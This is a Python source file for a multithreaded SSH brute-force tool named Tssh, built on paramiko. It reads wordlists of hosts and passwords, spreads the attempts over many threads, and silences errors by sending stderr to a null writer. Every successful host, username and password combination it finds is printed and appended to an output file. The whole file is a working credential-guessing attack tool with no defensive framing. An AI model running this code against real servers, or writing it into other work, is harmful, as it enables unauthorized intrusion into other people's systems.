from paramiko import SSHClient,AutoAddPolicy,AuthenticationException,SSHException
from threading import Thread
import numpy as np
from socket import timeout
import sys

class DevNull:
    def write(self, msg):
        pass

sys.stderr = DevNull()

class Tssh:
    def __init__(self,username:str,hostwl:str|None=None,host:str|None=None,passwordwl:str|None=None,password:str|None=None,port:int=22,retries:int=1,timeout:int=30,outfile:str|None=None,thread:int=40,silent:bool=False):
        self.username=username
        self.hostwl=hostwl
        self.host=host
        self.passwordwl=passwordwl
        self.password=password
        self.port=port
        self.retries=retries
        self.timeout=timeout
        self.thread=thread
        self.silent=silent
        self.outfile=outfile
        self.output=Output
        self.output.v=True
    
    def wordlistRead(self,filename:str)->list[str]:
        with open(filename,"r") as f:
            return [i.rstrip() for i in f.readlines()]
    
    def brute(self):
        hosts=[self.host]
        if self.hostwl:
            hosts=self.wordlistRead(self.hostwl)
        passwords=[self.password]
        if self.passwordwl:
            passwords=self.wordlistRead(self.passwordwl)

        bigList=hosts if len(hosts) >= len(passwords) else passwords
        if len(bigList) < self.thread:self.thread=len(bigList)
        part=[i.tolist() for i in [*np.array_split(bigList, self.thread)]]

        for threadCount in range(self.thread):
            def run(hosts,passwords):
                for host in hosts:
                    for password in passwords:
                        try:
                            self.connect(
                                SSHClient(),
                                host,
                                self.username,
                                password,
                                self.retries
                            )
                        except:
                            pass
            if bigList == hosts:
                Thread(target=run,args=(part[threadCount],passwords)).start()
            else:
                Thread(target=run,args=(hosts,part[threadCount])).start()

    def connect(self,client:SSHClient,host,username,password,cr:int=0)->dict[str,str]:
        try:
            client.set_missing_host_key_policy(AutoAddPolicy())
            client.connect(
                hostname=host,
                port=self.port,
                username=username,
                password=password,
                timeout =self.timeout,
                allow_agent=False,
                look_for_keys=False,
                banner_timeout=60
            )
            scstr=f"Host: {host}\tPort: {self.port}\tUsername: {username}\tPassword: {password}"
            if self.outfile:
                self.output.write(self.outfile,scstr)
            self.output.success(scstr)
            client.close()
            return {
                "hostname":host,
                "username":username,
                "password":password
            }
        except timeout:
            if cr > 1:
                cr-=1
                self.connect(client,host,username,password,cr)
        except:
            pass
        finally:
            client.close()

class Output:
    black   = "\033[0;30m"
    red     = "\033[0;31m"
    green   = "\033[0;32m"
    blue    = "\033[0;34m"
    yellow  = "\033[0;33m"
    white   = "\033[0;37m"
    reset = "\033[0m"
    v:bool=True
    def info(msg):
        if Output.v:
            print(f"{Output.blue}[Info] {msg}{Output.reset}")

    def success(msg):
        if Output.v:
            print(f"{Output.green}[Success] {msg}{Output.reset}")

    def write(filename,msg):
        with open(filename, 'a') as f:
            f.write(msg)